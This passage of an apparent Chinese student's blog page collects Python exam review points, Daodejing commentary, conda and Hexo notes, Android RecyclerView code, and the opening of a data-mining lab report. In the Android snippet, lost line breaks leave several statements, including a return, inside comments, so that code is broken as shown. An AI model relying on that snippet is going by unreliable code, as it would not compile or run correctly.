分，考试题型如下：<br>（1）单选题（40 题，1 分&#x2F;题，共 40 分）<br>（2）多选题（20 题，1 分&#x2F;题，共 20 分）<br>（3）填空题（30 题，1 分&#x2F;题，共 30 分）<br>（4）判断题（10 题，1 分&#x2F;题，共 10 分）</p>
<h2 id="期末复习要点"><a href="#期末复习要点" class="headerlink" title="期末复习要点"></a>期末复习要点</h2><h3 id="第-1-章-Python-基本使用"><a href="#第-1-章-Python-基本使用" class="headerlink" title="第 1 章 Python 基本使用"></a>第 1 章 Python 基本使用</h3><ol>
<li>计算机编程语言 Python 的特点。</li>
<li>IDLE 的功能，如何调试程序。</li>
<li>变量和常量，赋值语句，单行注释和多行注释。</li>
<li>如何导入模块。</li>
<li>通用函数：input()、print()、len()、int()、eval()等。</li>
<li>专用函数：upper()、lower()等。</li>
</ol>
<h3 id="第-2-章-基本数据的表示"><a href="#第-2-章-基本数据的表示" class="headerlink" title="第 2 章 基本数据的表示"></a>第 2 章 基本数据的表示</h3><ol>
<li>变量的命名规则与使用，Python 的保留字。</li>
<li>整数、浮点、字符串和布尔型数据，类型的判断及之间的转换。str() float() bool() int()</li>
<li>复数类型的表示，转义符的用法。</li>
<li>各种运算符及其优先级，Python 的书写规则。</li>
<li>不同进制数的表示及转换。</li>
<li>常用函数：type()、chr()、ord()、format()等。</li>
</ol>
<h3 id="第-3-章-控制语句"><a href="#第-3-章-控制语句" class="headerlink" title="第 3 章 控制语句"></a>第 3 章 控制语句</h3><ol>
<li>表达式的计算，常用运算符，全局变量。</li>
<li>顺序结构、单分支&#x2F;多分支结构、分支嵌套结构的程序设计。</li>
<li>for&#x2F;while 循环结构、多重循环、分支和循环嵌套的程序设计。</li>
<li>循环结构中 else 子句的用法，死循环的概念及中断。</li>
<li>break 和 continue 保留字的功能。</li>
<li>异常处理：基本语句结构，else 和 finally 子句的用法。</li>
<li>常用函数：input()、print()、range()、chr()、ord()、eval()、int()等。</li>
</ol>
<h3 id="第-4-章-函数与模块"><a href="#第-4-章-函数与模块" class="headerlink" title="第 4 章 函数与模块"></a>第 4 章 函数与模块</h3><ol>
<li>函数的定义和使用<br>（1）使用函数的优点。<br>（2）函数的分类（内置函数和用户自定义函数）。<br>（3）用户自定义函数的格式。</li>
<li>函数参数<br>（1）实参、形参的含义。(当我们调用函数时，需要向函数传递一些参数，这些参数称为实参（arguments），它们是函数调用时传入的具体值。而函数定义时声明的参数称为形参（parameters），它们是函数定义时指定的占位符变量，用于将函数调用时传入的实参接收并进行处理。)<br>（2）函数调用时参数传递有哪些方式（位置传参、默认参数、关键字传参），能通过实例进行判别。<br>（3）可变参数的定义方式（*和**运算符的作用）。( *args 来定义可变参数，表示该函数可以接收任意数量的位置参数。**kwargs 来定义可变参数，表示该函数可以接收任意数量的关键字参数。)<br>（4）return 语句的属性（位置、数量特点）。(return 语句用于结束函数并返回结果，在 Python 中可以出现在函数的任意位置，函数也可以有多个 return 语句，但只有一个执行。如果 return 语句后面没有跟值，或者 return 语句缺失，则函数返回 None。)</li>
<li>变量的作用域<br>（1）全局变量的含义（能通过实例辨别）、特点，声明全局变量的关键字。(声明全局变量的关键字是 global。如果需要在函数内部修改全局变量的值，必须使用 global 关键字来声明该变量是全局变量，否则 Python 将会把它视为函数内部新定义的一个局部变量。)<br>（2）局部变量的含义、特点。</li>
<li>匿名函数和递归函数<br>（1）匿名函数的特征（本质是一个表达式）。<br>（2）定义匿名函数的关键字、格式。(使用 lambda 关键字来创建函数对象,<code>lambda 参数列表: 表达式</code>)<br>（3）递归函数的概念及代码。</li>
<li>内置函数<br>（1）辨别常用的内置函数。<br>（2）常用函数：print()、range()、split()、list()、min()、max()、reverse()、int()、str()、ord()、chr()、eval()、append()、sorted()、input()等。<br>（3）time 库：time()、gmtime()、localtime()、ctime()、mktime()、strftime()、strptime()、perf_counter()、sleep()等。<br>2.计算生态。<br>（1）pip 库。三种安装方式（工具安装、自定义安装、文件安装）。<br>（2）PyInstaller 库。参数：Python 源程序文件名、-F、-i、-D、-clean 的功能。<br>（3）jieba 库。中文分词库，三种分词模式（精确模式 jieba.lcut(s)、全模式 jieba.lcut(s,cut_all&#x3D;True)、搜索引擎模式 jieba.lcut_for_search(s)）。<br>（4）wordcloud 库。创建 WordCloud 对象、generate(text)方法、to_file(filename)方法。<br>（5）NumPy 库的简单使用。numpy.array()函数、numpy.arange()函数。<br>（6）第三方库纵览（只要求了解第三方库的名称及分类）</li>
</ol>
<ul>
<li>数据分析：numpy、pandas、scipy</li>
<li>文本处理：beautifulsoup4、pdfminer、python-docx、openpyxl</li>
<li>数据可视化：matplotlib、TVTK、mayavi、seaborn</li>
<li>机器学习：TensorFlow、scikit-learn、Theano、mxnet、PyTorch</li>
<li>网络爬虫：requests、scrapy、grab</li>
<li>Web 开发：Django、Pyramid、Flask</li>
<li>图形用户界面：PyQt5、wxPython、PyGTK</li>
<li>游戏开发：Pygame、Panda3D、Cocos2d</li>
</ul>
<p>（7）更多第三方库:</p>
<ul>
<li>PIL：图像处理方面的重要第三方库</li>
<li>SymPy：支持符号计算，是一个全功能的计算机代数系统</li>
<li>NLTK：自然语言处理的第三方库</li>
<li>WeRoBot：微信机器人框架</li>
<li>MyQR：产生基本二维码、艺术二维码、动态效果二维码</li>
<li>Loso：另一种中文分词库</li>
<li>SnowNLP：情感分析</li>
</ul>
<h3 id="第-6-章-组合数据"><a href="#第-6-章-组合数据" class="headerlink" title="第 6 章 组合数据"></a>第 6 章 组合数据</h3><ol>
<li>组合数据的类型与表示，序列的类型。</li>
<li>序列（含字符串）的索引与切片，列表的复制与引用。</li>
<li>常用函数：list()、range()、len()、max()、format()、sorted()、input()、eval()、type()、chr()、ord()等。</li>
<li>列表函数（方法）：append()、index()、copy()、reverse()、insert()、pop()、clear()等。</li>
<li>字典函数（方法）：keys()、items()、pop()、popitem()、get()、update()等。</li>
</ol>
<h3 id="第-7-章-数据文件"><a href="#第-7-章-数据文件" class="headerlink" title="第 7 章 数据文件"></a>第 7 章 数据文件</h3><ol>
<li>文件类型：文本和二进制，文本文件的编码（中英文的 UTF-8 编码表示）。</li>
<li>文件指针：文本不同打开方式时指针的位置。</li>
<li>文件打开、读写和关闭。</li>
<li>常用函数和方法：open()、close()、read([size])、readline()、readlines()、write()、writelines()、tell()、seek()等。</li>
<li>目录路径概念，os 模块的 rename()、getcwd()、remove()、mkdir()的作用。</li>
<li>一维数据、二维数据和高维数据的特点、存储方式和表示形式。</li>
<li>采用 CSV 格式对一维和二维数据文件的读写。</li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/06/2eaba3ee2658.html">No title</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-13</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/">课程笔记</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E8%AF%AD%E6%96%87/">大学语文</a></span><div class="content"><h1 id="道德经"><a href="#道德经" class="headerlink" title="道德经"></a>道德经</h1><p>   </p>
<h2 id="二章"><a href="#二章" class="headerlink" title="二章"></a>二章</h2><p><strong>原文：</strong></p>
<p>天下皆知美之为美，斯恶已。皆知善之为善，斯不善已。故有无相生，难易相成，长短相形，高下相盈，音声相和，前后相随。恒也。是以圣人处无为之事，行不言之教。万物作焉而弗始。生而弗有，为而弗恃，功成而弗居。夫唯弗居，是以不去。</p>
<p><strong>提示：</strong><br>这一章分为两部分：第一部分，通过“美”、“善”，引申“有无”、“难易”、“长短”、“前后”，说明矛盾的对立与统一，及其相互影响、相互关联、和相互依存的关系；第二部分，要求人们按自然规律办事，不妄为、不过分苛求。</p>
<p><strong>解读：</strong></p>
<p>“天下皆知美之为美，斯恶已。”当天下都知道美的时候，那么，丑的观念也就产生了（“恶”，指丑）。</p>
<p>“皆知善之为善，斯不善已。”都知道善的时候，那么，不善的观念也就产生了。</p>
<p>“故有无相生，难易相成，长短相形，高下相盈，音声相和，前后相随。”因此，有无在对立中生成，难易在对立中形成，长短在对立中显现，高下（低）在对立中区分，音（乐）声（音）在对立中和谐，前后在对立中分别。</p>
<p>“恒也。”这是永恒不变的法则。</p>
<p>“是以圣人处无为之事，行不言之教。”所以，圣人用自然的法则——“无为”对待世事，用不言的方式施行教化。</p>
<p>“万物作焉而弗始。”任万物生长不加干预。</p>
<p>“生而弗有，为而弗恃，功成而弗居。”生养万物不据为私有，哺育万物不求报答，成就万物而不居功。</p>
<p>“夫唯弗居，是以不去。”因为其不居功，所以，业绩永存。</p>
<p>（注：“无为”是老子所用的一个特定概念。它指的是按自然规律办事，不是无所作为，而是不妄为。</p>
<h2 id="三章"><a href="#三章" class="headerlink" title="三章"></a>三章</h2><p><strong>原文：</strong></p>
<p>不尚贤，使民不争；不贵难得之货，使民不为盗；不见可欲，使民心不乱。是以圣人之治也，虚其心，实其腹，弱其志，强其骨。恒使民无知无欲。使夫智者不敢为也。为无为，则无不治矣。</p>
<p><strong>提示：</strong></p>
<p>这一章，讲的是如何治国的问题。在老子看来，要使国家安定，最根本的是要解决好社会矛盾。“尚贤”、“贵难得之货”、“见可欲”，都是容易引起社会动乱的动因。老子认为，解决这一问题最好的办法是“无为”。</p>
<p><strong>解读：</strong></p>
<p>“不尚贤，使民不争；不贵难得之货，使民不为盗；不见可欲，使民心不乱。”不去推崇重用那些有才干的能人，民众就不会为此去争名夺利；不贵重那些难得的东西，民众就不会去偷盗；看不到（不显露）可引起贪欲的东西，民众就不会产生欲望。</p>
<p>“是以圣人之治也，虚其心，实其腹，弱其志，强其骨。”所以，圣人的治理方法是：淡化他的心理（欲望），解决他的温饱，减低他的志向，强壮他的身体。</p>
<p>“恒使民无知无欲。”使百姓永远不会去奇思妙想，有过分的欲望。</p>
<p>“使夫智者不敢为也。”使那些有心智的人不敢妄为。</p>
<p>“为无为，则无不治也。”按照“无为”的方法去治理，那么，就没有什么治理不好的</p>
<h2 id="二十二章"><a href="#二十二章" class="headerlink" title="二十二章"></a>二十二章</h2><p><strong>原文：</strong></p>
<p>曲则全，枉则直，洼则盈，敝则新，少则得，多则惑。是以圣人抱一为天下式。不自见，故明；不自是，故彰；不自伐，故有功；不自矜，故长。夫唯不争，故天下莫能与之争。古之所谓“曲则全”者，岂虚言哉！诚全而归之。</p>
<p><strong>提示：</strong></p>
<p>这一章老子以“正反璧合”的方式，论述矛盾相互转化的辩证关系。以委屈，反而能保全；低凹，反而能积满；少取，反而能有得的道理，说明矛盾的两面性。并提出以“道”，作为观天下的规范。</p>
<p><strong>解读：</strong></p>
<p>“曲则全，枉则直，洼则盈，敝则新，少则得，多则惑。”<br>委屈反而能保全，弯曲反而能伸展，低洼之处反而能充盈，破旧反而能产生崭新，少取反而能多得，贪多反而会迷惑。</p>
<p>“是以圣人抱一为天下式。”<br>所以，圣人以“道”作为观察天下的范式。</p>
<p>“不自见，故明；不自是，故彰；不自伐，故有功；不自矜，故长。”<br>不自我显示（表现），反而能显明；不自以为是，反而能显著；不自己夸赞，反而能有功劳；不自我骄傲，反而能长久。</p>
<p>“夫唯不争，故天下莫能与之争。”<br>正因为他不与别人相争，所以天下没有人能与他争。</p>
<p>“古之所谓‘曲则全’者，岂虚言哉！诚全而归之。”<br>古时所说“委屈反而能保全”的话，怎么会是空话呢？它实实在在能够达到。</p>
<h2 id="六十三章"><a href="#六十三章" class="headerlink" title="六十三章"></a>六十三章</h2><p><strong>原文：</strong></p>
<p>为无为，事无事，味无味。大小，多少，报怨以德。图难于其易，为大于其细。天下难事，必作于易；天下大事，必作于细。是以圣人终不为大，故能成其大。夫轻诺必寡信，多易必多难。是以圣人犹难之，故终无难矣。</p>
<p><strong>提示：</strong></p>
<p>这一章讲的是圣人的处事原则。</p>
<p><strong>解读：</strong></p>
<p>“为无为，事无事，味无味。”<br>以“无为”的态度去作为，以“无事”的方式去做事，把恬淡无味当作味。</p>
<p>“大小，多少，报怨以德。”<br>大生于小，多起于小，用恩德去报答别人的仇怨。</p>
<p>“图难于其易，为大于其细。”<br>解决困难的事从它容易的地方入手，做大事要从细小的地方入手。</p>
<p>“天下难事，必作于易；天下大事，必作于细。”<br>天下的难事，必须从容易的地方做起；天下的大事，必须从细微的地方着眼。</p>
<p>“是以圣人终不为大，故能成其大。”<br>因此，圣人不自以为在干大事情，所以，才能做成大事。</p>
<p>“夫轻诺必寡信，多易必多难。”<br>轻易许诺必然很少守信用，把事情看得过分容易必然带来更多的困难。</p>
<p>“是以圣人犹难之，故终无难矣。”<br>因此，圣人尚且把事看得困难，所以，终究没有困难。</p>
<h2 id="七十七章"><a href="#七十七章" class="headerlink" title="七十七章"></a>七十七章</h2><p><strong>原文：</strong></p>
<p>天之道，其犹张弓欤？高者抑之，下者举之；有余者损之，不足者补之。天之道，损有余而补不足。人之道则不然，损不足而奉有余。孰能有余以奉天下，唯有道者。是以圣人为而不恃，功成而不处，其不欲见贤。</p>
<p><strong>提示：</strong></p>
<p>这一章讲的是“天道”与“人道”的区别。说明“天道”，近“道”；“人道”，远“道”。</p>
<p><strong>解读：</strong></p>
<p>“天之道，其犹张弓欤？”指自然的法则，就像拉弓射箭一样。</p>
<p>“高者抑之，下者举之；有余者损之，不足者补之。”偏高就放低一点，偏低就举高一些；拉得过满就放松一点，用力不足就加强一些。</p>
<p>“天之道，损有余而补不足。”自然的法则，是减去过剩补充不足。</p>
<p>“人之道则不然，损不足而奉有余。”人的法则则不是这样，是减去不够供奉给有余。</p>
<p>“孰能有余以奉天下，唯有道者。”谁能把有余的奉献给天下，只有尊循“道”的人。</p>
<p>“是以圣人为而不恃，功成而不处，其不欲见贤。”所以，有“道”的圣人有奉献不自恃有功，有成就而不自居，因为他不愿去表现自己的无私。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/06/249c515e01aa.html">速记</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-08</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E9%80%9F%E8%AE%B0/">速记</a></span><div class="content"><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/387408041">https://zhuanlan.zhihu.com/p/387408041</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_52529907/article/details/127136072">(108条消息) Windows10 安装 WSL2_windows10 wsl2_一个默默无闻的小程序员的博客-CSDN博客</a></p>
<h1 id="系统镜像文件"><a href="#系统镜像文件" class="headerlink" title="系统镜像文件"></a>系统镜像文件</h1><p><a target="_blank" rel="noopener" href="https://next.itellyou.cn/Original/Index?id=7ab5f0cb-7607-4bbe-9e88-50716dc43de6#cbp=Product?ID=6f677346-0a09-43fa-b60d-e878ed7625a0">https://next.itellyou.cn/Original/Index?id=7ab5f0cb-7607-4bbe-9e88-50716dc43de6#cbp=Product?ID=6f677346-0a09-43fa-b60d-e878ed7625a0</a></p>
<p>查看环境<br>conda info –envs</p>
<p>激活环境<br>activate envs</p>
<p>退出当前环境<br>deactivate envs</p>
<ul>
<li>删除环境</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda remove -n 环境名 --all</span><br></pre></td></tr></table></figure>

<p>创建环境<br>conda create  -n envname python&#x3D;versionnumber</p>
<p>教务系统官网<br>\<a target="_blank" rel="noopener" href="https://jwxt.nufe.edu.cn/student/login">https://jwxt.nufe.edu.cn/student/login</a></p>
<p>联网<br><a target="_blank" rel="noopener" href="http://10.200.253.5/">上网登录页</a></p>
<p>姚的记录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">【南京人力资源和社会保障学会】：报名2023年下半年企业人力资源管理师、劳动关系协调员、企业人力资源管理师（劳务派遣管理员）考试的同志（机构报名的学员由机构统一送交审核材料）请于10月7日—10月17日(周末正常审核)上午9:00-11:30 下午13:30-16:30携带以下资料前往鼓楼区管家桥55号（南京市职业技能培训中心）三楼301教室进行资格审核，通过人员现场缴纳费用（支付宝、现金）  </span><br><span class="line">现场审验纸质材料：（初考人员以下1、2、3项需要提供原件及复印件，第4项手工填写，其余项提供打印件即可。补考人员只需携带身份证原件及复印件，现场填写职业技能认定个人登记表。）  </span><br><span class="line">1、身份证（或军官证、护照、港澳台通行证。驾驶证和医保卡除外）  </span><br><span class="line">2、学历证书（学历证书、学信网学历证书电子注册备案表，电子注册备案表有效期选择6个月。）  </span><br><span class="line">（1）国内学历：提交全国高等学校学生信息咨询与就业指导中心出具的《中国高等教育学历认证报告》或学信网的电子注册备案表；  </span><br><span class="line">（2）国内学位：提交教育部学位与研究生教育发展中心出具的《认证报告》或江苏省大学生信息服务中心出具的《江苏省学位证书认证报告》；  </span><br><span class="line">（3）国（境）外学历学位：提交教育部留学服务中心出具的《国外学历学位认证书》；  </span><br><span class="line">（4）党校、军校院校取得的学历：提交档案保管部门签章确认的《毕业生登记表》；  </span><br><span class="line">（5）高中学历：提交毕业证书  </span><br><span class="line">（6）在校生（含自考未毕业）：出具学校开具的相关证明  </span><br><span class="line">3、现职业证书。（考四级证书的人员无需提供现职业证书）  </span><br><span class="line">4、工作年限承诺书（固定模板见申报通知附件3,承诺书填写部分全部手工填写。）  </span><br><span class="line">5、申报人员现场填写（职业技能认定个人登记表）  </span><br><span class="line">6、请涉及到工作年限的报名人员，需提供相对应的社保缴纳证明  </span><br><span class="line">7、证明已完成江苏人社线上平台实名注册认证的截图</span><br></pre></td></tr></table></figure>

<p>同步博客流程</p>
<ol>
<li>创建新文件</li>
<li>填充title</li>
<li>hexo g (生成静态页面)</li>
<li>hexo d(上传)</li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/06/ba95bad06ff4.html">No title</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-05</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/">课程笔记</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%AE%89%E5%8D%93%E8%AE%BA%E6%96%87/">安卓论文</a></span><div class="content"><p>package com.example.test.ui.home;  </p>
<p>import android.os.Bundle;<br>import android.view.LayoutInflater;<br>import android.view.View;<br>import android.view.ViewGroup;<br>import android.widget.ImageView;<br>import android.widget.TextView;  </p>
<p>import androidx.annotation.NonNull;<br>import androidx.fragment.app.Fragment;<br>import androidx.lifecycle.ViewModelProvider;<br>import androidx.recyclerview.widget.RecyclerView;<br>import androidx.recyclerview.widget.StaggeredGridLayoutManager;  </p>
<p>import com.example.test.R;<br>import com.example.test.databinding.FragmentHomeBinding;  </p>
<p>import java.util.ArrayList;<br>import java.util.List;<br>import java.util.Random;  </p>
<p>public class HomeFragment extends Fragment {  </p>
<pre><code>private FragmentHomeBinding binding;  
private RecyclerView recyclerView;  
private List&lt;CardData&gt; cardDataList;  

public View onCreateView(@NonNull LayoutInflater inflater,  
                         ViewGroup container, Bundle savedInstanceState) &#123;  
    View root = inflater.inflate(R.layout.fragment_home, container, false);  

    // Initialize your data.  
    cardDataList = new ArrayList&lt;&gt;();  
    cardDataList.add(new CardData(R.drawable.p1, &quot;Text 1&quot;));  
    cardDataList.add(new CardData(R.drawable.p2, &quot;Text 2&quot;));  
    cardDataList.add(new CardData(R.drawable.p3, &quot;Text 3&quot;));  
    cardDataList.add(new CardData(R.drawable.p4, &quot;Text 4&quot;));  

    recyclerView =root.findViewById(R.id.recyclerView);  
    recyclerView.setLayoutManager(new StaggeredGridLayoutManager(2, StaggeredGridLayoutManager.VERTICAL));  
    recyclerView.setAdapter(new MyAdapter());  

    return root;  
&#125;  


private class MyAdapter extends RecyclerView.Adapter&lt;MyAdapter.MyViewHolder&gt; &#123;  

    private Random random = new Random();  

    private static final int HEIGHT_TYPE_1_DP = 400;  
    private static final int HEIGHT_TYPE_2_DP = (int)(HEIGHT_TYPE_1_DP * 1.2);  

    @Override  
    public MyViewHolder onCreateViewHolder(ViewGroup parent, int viewType) &#123;  
        View view = LayoutInflater.from(parent.getContext()).inflate(R.layout.item_card, parent, false);  
        return new MyViewHolder(view);  
    &#125;  

    @Override  
    public void onBindViewHolder(MyViewHolder holder, int position) &#123;  
        // Set your image and text here.  
        // You can use position to get the corresponding data.            // holder.imageView.setImageResource(...);            // holder.textView.setText(...);            CardData cardData = cardDataList.get(position);  
        holder.imageView.setImageResource(cardData.getImageResId());  
        holder.textView.setText(cardData.getText());  

        // Set the height of imageView.  
        ViewGroup.LayoutParams layoutParams = holder.imageView.getLayoutParams();  
        if (position % 2 == 0) &#123;  
            layoutParams.height = dpToPx(HEIGHT_TYPE_2_DP);  
        &#125; else &#123;  
            layoutParams.height = dpToPx(HEIGHT_TYPE_1_DP);  
        &#125;  
        holder.imageView.setLayoutParams(layoutParams);  
    &#125;  

    @Override  
    public int getItemCount() &#123;  
        // Return the total number of items.  
        // You should replace this with your own data.            return cardDataList.size();  
    &#125;  

    private int dpToPx(int dp) &#123;  
        float density = getResources().getDisplayMetrics().density;  
        return (int) (dp * density + 0.5f);  
    &#125;  
    class MyViewHolder extends RecyclerView.ViewHolder &#123;  

        ImageView imageView;  
        TextView textView;  

        MyViewHolder(View view) &#123;  
            super(view);  
            imageView = view.findViewById(R.id.imageView);  
            textView = view.findViewById(R.id.textView);  
        &#125;  
    &#125;  
&#125;  


public class CardData &#123;  
    private int imageResId;  
    private String text;  

    public CardData(int imageResId, String text) &#123;  
        this.imageResId = imageResId;  
        this.text = text;  
    &#125;  

    public int getImageResId() &#123;  
        return imageResId;  
    &#125;  

    public String getText() &#123;  
        return text;  
    &#125;  
&#125;  



@Override  
public void onDestroyView() &#123;  
    super.onDestroyView();  
    binding = null;  
&#125;  
</code></pre>
<p>}</p>
<?xml version="1.0" encoding="utf-8"?><p>&lt;androidx.coordinatorlayout.widget.CoordinatorLayout xmlns:android&#x3D;”<a target="_blank" rel="noopener" href="http://schemas.android.com/apk/res/android">http://schemas.android.com/apk/res/android</a>“<br>    xmlns:app&#x3D;”<a target="_blank" rel="noopener" href="http://schemas.android.com/apk/res-auto">http://schemas.android.com/apk/res-auto</a>“<br>    xmlns:tools&#x3D;”<a target="_blank" rel="noopener" href="http://schemas.android.com/tools">http://schemas.android.com/tools</a>“<br>    android:layout_width&#x3D;”match_parent”<br>    android:layout_height&#x3D;”match_parent”<br>    tools:context&#x3D;”.ui.home.HomeFragment”&gt;  </p>
<pre><code>&lt;com.google.android.material.appbar.AppBarLayout        android:layout_width=&quot;match_parent&quot;  
    android:layout_height=&quot;wrap_content&quot;&gt;  

    &lt;ImageView            android:id=&quot;@+id/topImageView&quot;  
        android:layout_width=&quot;match_parent&quot;  
        android:layout_height=&quot;200dp&quot;  
        android:src=&quot;@drawable/p5&quot;  
        android:scaleType=&quot;centerCrop&quot;  
        app:layout_scrollFlags=&quot;scroll|enterAlways|snap&quot; /&gt;  

&lt;/com.google.android.material.appbar.AppBarLayout&gt;  
&lt;androidx.recyclerview.widget.RecyclerView        android:id=&quot;@+id/recyclerView&quot;  
    android:layout_width=&quot;match_parent&quot;  
    android:layout_height=&quot;match_parent&quot;  
    android:layout_marginTop=&quot;0dp&quot;  
    app:layout_behavior=&quot;@string/appbar_scrolling_view_behavior&quot; /&gt;  

&lt;com.google.android.material.floatingactionbutton.FloatingActionButton        android:id=&quot;@+id/scrollToTopButton&quot;  
    android:layout_width=&quot;wrap_content&quot;  
    android:layout_height=&quot;wrap_content&quot;  
    android:layout_margin=&quot;16dp&quot;  
    android:src=&quot;@drawable/ic_notifications_black_24dp&quot;  
    app:layout_anchor=&quot;@id/recyclerView&quot;  
    app:layout_anchorGravity=&quot;bottom|end&quot;  
    app:layout_behavior=&quot;com.google.android.material.behavior.HideBottomViewOnScrollBehavior&quot; /&gt;  
</code></pre>
<p>&lt;&#x2F;androidx.coordinatorlayout.widget.CoordinatorLayout&gt;</p>
<?xml version="1.0" encoding="utf-8"?><p>&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android&#x3D;”<a target="_blank" rel="noopener" href="http://schemas.android.com/apk/res/android">http://schemas.android.com/apk/res/android</a>“<br>    xmlns:app&#x3D;”<a target="_blank" rel="noopener" href="http://schemas.android.com/apk/res-auto">http://schemas.android.com/apk/res-auto</a>“<br>    xmlns:tools&#x3D;”<a target="_blank" rel="noopener" href="http://schemas.android.com/tools">http://schemas.android.com/tools</a>“<br>    android:layout_width&#x3D;”match_parent”<br>    android:layout_height&#x3D;”match_parent”<br>    tools:context&#x3D;”.ui.home.HomeFragment”&gt;<br>    <ImageView        android:id="@+id/topImageView"  
        android:layout_width="0dp"  
        android:layout_height="200dp"  
        android:src="@drawable/p5"  
        app:layout_constraintTop_toTopOf="parent"  
        app:layout_constraintStart_toStartOf="parent"  
        app:layout_constraintEnd_toEndOf="parent" />  </p>
<pre><code>&lt;com.google.android.material.floatingactionbutton.FloatingActionButton        android:id=&quot;@+id/scrollToTopButton&quot;  
    android:layout_width=&quot;wrap_content&quot;  
    android:layout_height=&quot;wrap_content&quot;  
    android:layout_alignParentEnd=&quot;true&quot;  
    android:layout_alignParentBottom=&quot;true&quot;  
    android:layout_margin=&quot;16dp&quot;  
    android:layout_marginEnd=&quot;52dp&quot;  
    android:layout_marginBottom=&quot;144dp&quot;  
    android:src=&quot;@drawable/ic_notifications_black_24dp&quot;  
    app:backgroundTint=&quot;@color/purple_500&quot;  
    app:layout_constraintBottom_toBottomOf=&quot;@+id/recyclerView&quot;  
    app:layout_constraintEnd_toEndOf=&quot;@+id/recyclerView&quot; /&gt;  

&lt;androidx.recyclerview.widget.RecyclerView       
     android:id=&quot;@+id/recyclerView&quot;  
    android:layout_width=&quot;0dp&quot;  
    android:layout_height=&quot;0dp&quot;  
    android:layout_marginBottom=&quot;?attr/actionBarSize&quot;  
    android:layout_marginTop=&quot;150dp&quot;  
    app:layout_constraintBottom_toBottomOf=&quot;parent&quot;  
    app:layout_constraintHorizontal_bias=&quot;0.0&quot;  
    app:layout_constraintLeft_toLeftOf=&quot;parent&quot;  
    app:layout_constraintRight_toRightOf=&quot;parent&quot;  
    app:layout_constraintTop_toTopOf=&quot;parent&quot;  
    app:layout_constraintVertical_bias=&quot;1.0&quot; /&gt;  
</code></pre>
<p>&lt;&#x2F;androidx.constraintlayout.widget.ConstraintLayout&gt;</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/06/1411b53ef5dd.html">No title</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-04</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/">课程笔记</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/">数据挖掘</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">实验报告</a></span><div class="content"><h1 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h1><h1 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h1><p>(1) 编写程序，实现数据的预处理，以及检查数据的分布特征。<br>(2) 调用有关模型，检查数据异常值，并且比较与分析模型。<br>(3) 写出实验报告。</p>
<h1 id="二、实验原理"><a href="#二、实验原理" class="headerlink" title="二、实验原理"></a>二、实验原理</h1><p>(1)  数据预测处理：现实世界中的数据库极易受到噪音数据、遗漏数据和不一致性数据的估计，为提供⾼数据质量进入并提供⾼挖掘结果的质量，产生了大数据预测处理技术。数据预测处理有多种方法：数据清理，数据集合，数据变换，数据归约等。这些数据处理技术在 数据挖掘之前使用，大大提⾼了数据挖掘模型的质量，降低了实际挖掘所需要的时间。</p>
<p>(2) 数据清理：数据清理示例通过填写遗漏的值，平滑噪声数据，识别、删去离群点，并解决不一致于“理”数据。</p>
